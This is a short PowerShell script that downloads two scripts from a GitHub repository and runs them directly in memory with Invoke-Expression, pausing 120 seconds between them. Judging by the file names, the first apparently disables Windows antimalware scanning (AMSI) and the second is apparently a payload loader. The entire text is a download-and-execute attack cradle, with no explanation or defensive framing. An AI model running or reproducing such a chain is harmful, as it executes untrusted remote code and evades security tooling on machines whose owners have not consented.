$scriptUrl1 = "https://github.com/SV-ZeroOne/Public_Code/raw/master/offsec_amsi_poc.ps1"
$scriptUrl2 = "https://github.com/SV-ZeroOne/Public_Code/raw/master/cs_mc_x64.ps1"

$script1Content = Invoke-WebRequest -Uri $scriptUrl1 -UseBasicParsing | Select-Object -ExpandProperty Content
Invoke-Expression $script1Content

Sleep 120

$script2Content = Invoke-WebRequest -Uri $scriptUrl2 -UseBasicParsing | Select-Object -ExpandProperty Content
Invoke-Expression $script2Content